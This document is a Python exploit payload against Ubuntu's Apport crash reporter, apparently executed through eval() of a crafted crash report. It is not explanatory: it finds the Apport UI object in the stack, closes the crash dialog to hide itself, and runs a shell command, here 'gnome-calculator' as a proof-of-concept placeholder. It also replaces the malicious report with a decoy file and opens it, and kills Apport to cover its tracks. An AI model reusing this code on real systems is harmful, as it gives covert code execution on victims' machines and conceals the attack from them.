payload_cmd = "gnome-calculator"

# We need a reference to the UI object As eval() is called without direct access to
# the module globals we need to find the reference to the UI object in the Python stack.
import inspect
ui = inspect.getouterframes(inspect.currentframe())[-2][0].f_locals["self"]

# Destroy the main Apport window to minimise the window popup time during exploitation.
ui.w('dialog_crash_new').destroy()

def slow_tasks(ui):
    import subprocess
    import base64
    import shlex

    print("Running payload: %s" % payload_cmd)
    subprocess.Popen(payload_cmd, shell=True)

    # Open the exploit file so the it can be replace or cleaned
    with open(ui.report_file, "wb") as f:
        # Replace the downloaded payload with the decoy file
        decoy_data_b64 = ui.report.pop("_MemoryDump", None)
        if decoy_data_b64:
            decoy_data_b64 = "".join(decoy_data_b64.splitlines()[1:])
            f.write(base64.b64decode(decoy_data_b64))
            print("Replaced %s with the decoy file" % ui.report_file)

            command = '{} {}'.format(ui.report["ProcCmdline"], shlex.quote(ui.report_file))
            print("Running decoy command", command)
            subprocess.Popen(command, shell=True)

        else:
            # Write the updated file without the CrashDB entry if we don't have a decoy.
            ui.report.pop("CrashDB", None)  # Remove CrashDB payload from the report
            ui.report.write(f)
            print("Replaced %s with clean report" % ui.report_file)

    print("Killing the Apport process")
    subprocess.Popen("pkill apport", shell=True)

import threading
slow_task = threading.Thread(target=slow_tasks, args=(ui,))
slow_task.start()
